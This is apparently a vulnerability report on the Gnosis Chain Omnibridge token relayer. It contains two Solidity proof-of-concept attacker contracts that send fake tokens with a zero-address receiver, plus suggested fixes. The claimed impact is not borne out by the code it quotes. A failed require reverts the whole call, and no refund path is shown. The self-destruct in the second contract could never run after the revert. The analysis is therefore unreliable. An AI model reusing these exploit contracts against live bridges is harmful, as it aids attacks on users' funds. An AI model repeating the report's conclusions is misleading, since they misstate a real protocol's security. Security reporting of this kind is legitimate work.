
# Gnosis Chain




## Vulnerability Name
Input Validation Vulnerability




##  Target
https://github.com/gnosischain/omnibridge/blob/master/contracts/upgradeable_contracts/components/common/TokensRelayer.sol






##  Report Type
Smart Contract




## Severity
Medium 





## Description
✅Scenario 1
The attacker deploys a malicious contract containing a fake token and uses it to initiate a token transfer to the bridge. During this process, the attacker sets the receiver address to address(0) and sends the fake tokens to the bridge. When the bridge logic reaches the bridgeSpecificActionsOnTokenTransfer function, it reverts due to a failed require condition (which checks for a valid receiver address), halting the entire bridging operation.

Subsequently, the bridge attempts to return the tokens to the attacker’s contract. However, since the malicious contract is designed to deliberately revert within its fallback or receive function, the token return operation also fails. This behavior disrupts the internal logic of the bridge and causes the affected function to stop functioning entirely.

While this attack is commonly demonstrated using fake tokens, it can also be executed with legitimate tokens. The use of fake tokens simplifies the process because the bridge function accepts any token input without strict validation.


✅Scenario 2

It’s exactly the same scenario as above, but this time the attacker destroys the malicious contract after sending the fake token, ensuring that if the `bridgeSpecificActionsOnTokenTransfer` function reverts, the tokens cannot be transferred to this address.








##  Impact

This vulnerability causes the bridge logic to revert during token processing, particularly when attempting to forward tokens to a recipient address. If the recipient address is set to `address(0)` (the zero address), the `bridgeSpecificActionsOnTokenTransfer` function will revert due to a failed `require` condition, halting the entire bridging process.  
Furthermore, if the bridge attempts to return the tokens to the attacker's contract and that contract deliberately reverts within its `fallback` or `receive` function, the token return operation will also fail. This leads to the bridge logic getting stuck in the token return path, making recovery of the tokens impossible and causing further disruption to the protocol’s functionality, ultimately resulting in the failure of related functions.












## 🔍 Vulnerability Details

```solidity

//https://github.com/gnosischain/omnibridge/blob/master/contracts/upgradeable_contracts/components/common/TokensRelayer.sol

    function onTokenTransfer(address _from,uint256 _value,bytes memory _data) external returns (bool) {
        //💀?
        if (!lock()) {
            bytes memory data = new bytes(0);
            address receiver = _from;
            if (_data.length >= 20) {
                receiver = Bytes.bytesToAddress(_data);
                if (_data.length > 20) {
                    assembly {
                        let size := sub(mload(_data), 20)
                        data := add(_data, 20)
                        mstore(data, size)
                    }
                }
            }
            bridgeSpecificActionsOnTokenTransfer(msg.sender, _from, receiver, _value, data);
        }
        return true;
    }


//https://github.com/gnosischain/omnibridge/blob/master/contracts/upgradeable_contracts/ForeignOmnibridge.sol

        function bridgeSpecificActionsOnTokenTransfer(
        address _token,
        address _from,
        address _receiver,
        uint256 _value,
        bytes memory _data
    ) internal virtual override {
        require(_receiver != address(0) && _receiver != mediatorContractOnOtherSide());//💀?

        // native unbridged token
        if (!isTokenRegistered(_token)) {
            uint8 decimals = TokenReader.readDecimals(_token);
            _initializeTokenBridgeLimits(_token, decimals);
        }

        require(withinLimit(_token, _value));
        addTotalSpentPerDay(_token, getCurrentDay(), _value);

        bytes memory data = _prepareMessage(nativeTokenAddress(_token), _token, _receiver, _value, _data);
        bytes32 _messageId = _passMessage(data, true);
        _recordBridgeOperation(_messageId, _token, _from, _value);
    }

```











## 🧪 Proof of Concept (PoC)

```solidity

✅Scenario 1



// Attacker 

// SPDX-License-Identifier: MIT
pragma solidity ^0.7.5;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Fake ERC677 Token (Malicious Version)
contract FakeERC677Token is ERC20 {
    uint256 private initialSupply = 1000000 * 10**18;

    constructor() ERC20("FakeERC677Token", "FET677") {
        _mint(msg.sender, initialSupply);
    }

    // Exploit trigger function
    function exploit(address bridge, uint256 value) external {
        require(balanceOf(msg.sender) >= value, "Not enough tokens");

        _transfer(msg.sender, address(this), value);

        _approve(address(this), bridge, value);

        bytes memory maliciousData = abi.encodePacked(address(0));
        //bytes memory maliciousData = abi.encodePacked(0x0000000000000000000000000000000000000000);


        transferAndCall(bridge, value, maliciousData);
    }

    function transferAndCall(address to, uint256 value, bytes memory data) public returns (bool) {
        _transfer(msg.sender, to, value);

        // Call onTokenTransfer on the recipient (bridge)
        (bool success, ) = to.call(
            abi.encodeWithSignature("onTokenTransfer(address,uint256,bytes)", msg.sender, value, data)
        );
        require(success, "ERC677: transferAndCall failed");

        return true;
    }

    fallback() external payable {
        revert("Malicious contract refuses token refund");
    }

    receive() external payable {
        revert("Malicious contract refuses ETH");
    }
}








✅Scenario 2



// SPDX-License-Identifier: MIT
pragma solidity ^0.7.5;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Fake ERC677 Token (Malicious Version)
contract FakeERC677Token is ERC20 {
    uint256 private initialSupply = 1000000 * 10**18;

    constructor() ERC20("FakeERC677Token", "FET677") {
        _mint(msg.sender, initialSupply);
    }

    // Exploit trigger function
    function exploit(address bridge, uint256 value) external {
        require(balanceOf(msg.sender) >= value, "Not enough tokens");

        _transfer(msg.sender, address(this), value);

        _approve(address(this), bridge, value);

        bytes memory maliciousData = abi.encodePacked(address(0));
        //bytes memory maliciousData = abi.encodePacked(0x0000000000000000000000000000000000000000);

        transferAndCall(bridge, value, maliciousData);

        selfdestruct(payable(address(0))); 
    }

    function transferAndCall(address to, uint256 value, bytes memory data) public returns (bool) {
        _transfer(msg.sender, to, value);

        (bool success, ) = to.call(
            abi.encodeWithSignature("onTokenTransfer(address,uint256,bytes)", msg.sender, value, data)
        );
        require(success, "ERC677: transferAndCall failed");

        return true;
    }
}


```





## How to fix it (Recommended)

```solidity
✅ set this in onTokenTransfer function       
    require(receiver != address(0), "Receiver address cannot be zero");



✅You can allow only addresses that are on the whitelist to transfer tokens to your contract. This means that only tokens from verified and known addresses will be processed.

contract TokenBridge {

    mapping(address => bool) public whitelistedTokens;  // Storing whitelisted token addresses

    // Only whitelisted tokens can be sent to this contract
    function setWhitelist(address _token, bool _status) external {
        // Only the contract owner can modify the whitelist
        // Add access control to this function as per your needs
        whitelistedTokens[_token] = _status;
    }
}
//Use This.... in bridgeSpecificActionsOnTokenTransfer
        require(whitelistedTokens[_token], "Token not whitelisted");




✅Since there is no criterion to distinguish between fake tokens and real tokens, one of the solutions is to remove the require(_receiver != address(0)) in the bridgeSpecificActionsOnTokenTransfer function. However, it should be noted that this approach could cause issues in specific cases

```









## 🔗 References

- https://etherscan.io/address/0x8eb3b7d8498a6716904577b2579e1c313d48e347#code

- https://github.com/gnosischain/omnibridge/blob/master/contracts/upgradeable_contracts/components/common/TokensRelayer.sol

- https://github.com/gnosischain/omnibridge/blob/master/contracts/upgradeable_contracts/ForeignOmnibridge.sol
